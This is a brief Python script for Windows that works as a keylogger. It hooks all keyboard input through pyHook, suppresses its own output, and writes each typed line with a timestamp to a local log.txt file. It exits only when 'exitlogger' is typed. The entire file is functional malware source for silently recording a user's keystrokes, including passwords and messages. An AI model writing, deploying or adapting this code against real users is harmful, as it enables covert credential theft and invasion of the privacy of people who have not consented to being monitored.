__author__ = 'Gregory'

import win32api
import win32console
import win32gui
import pythoncom
import pyHook
import sys
import os
import time

sys.stderr = sys.stdout = os.devnull
#sys.stderr = sys.stdout

class Logger:
    buffer = ''

def OnKeyboardEvent(event):
    if event.Ascii != None:
        if event.Ascii in range(32, 127):
            Logger.buffer += chr(event.Ascii)
            #print(chr(event.Ascii))
        elif event.Ascii == 13:
            Logger.buffer += '\n'
            #print('Logging: ' + Logger.buffer)
            f = open('log.txt', 'a')
            t = time.strftime('%Y.%d.%m.%H:%M:%S')
            f.write(t + ": " + Logger.buffer)
            f.close()

            if 'exitlogger' in Logger.buffer:
                sys.exit(0)

            Logger.buffer = ''

        return 1

# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
